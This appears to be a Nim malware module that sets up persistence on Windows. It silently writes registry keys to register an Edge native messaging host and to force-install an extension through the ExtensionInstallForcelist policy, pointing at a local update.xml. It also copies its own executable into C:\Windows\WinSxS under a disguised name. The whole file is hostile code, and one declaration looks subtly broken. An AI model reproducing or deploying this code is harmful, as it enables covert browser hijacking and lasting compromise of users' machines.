import std/[httpclient, json, os, osproc, strutils, base64]





proc installPersistence*(deployPath: string, index: int = 1) =
  let baseDir = deployPath.parentDir

# 1. Native Messaging Host Kaydı
  let nmRegPath* = r"HKCU\Software\Microsoft\Edge\NativeMessagingHosts\com.launcher.agent"
  var p1 = startProcess(
    "reg.exe",
    args = [
      "add", nmRegPath,
      "/ve", "/t", "REG_SZ",
      "/d", baseDir & "\\host.json",
      "/f"
    ],
    options = {poNoConsole, poUsePath}
  )
  discard p1.waitForExit()
  p1.close()

  # 2. Edge Zorunlu Eklenti Kaydı
  let extRegPath = r"HKCU\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist"
  let extID = "jfnphkdpdjgokfnchpnlaekcgchlnfln"
  let xmlUrl = "file:///" & baseDir.replace("\\", "/") & "/update.xml"

  var p2 = startProcess(
    "reg.exe",
    args = [
      "add", extRegPath,
      "/v", $index,
      "/t", "REG_SZ",
      "/d", extID & ";" & xmlUrl,
      "/f"
    ],
    options = {poNoConsole, poUsePath}
  )
  discard p2.waitForExit()
  p2.close()

  # When did Windows start peeling oranges.... Privacy is good !





proc peel*() =
  let originBinaryLoc = getAppFilename()
  let baseVaultDir = "C:\\Windows\\WinSxS"
  let deployTargetPath = baseVaultDir / "WindowsOrangePeller.exe"
  try:
    copyFile(originBinaryLoc, deployTargetPath)
    echo "good peel ", deployTargetPath
  except OSError as e:
    echo "a error ", e.msg
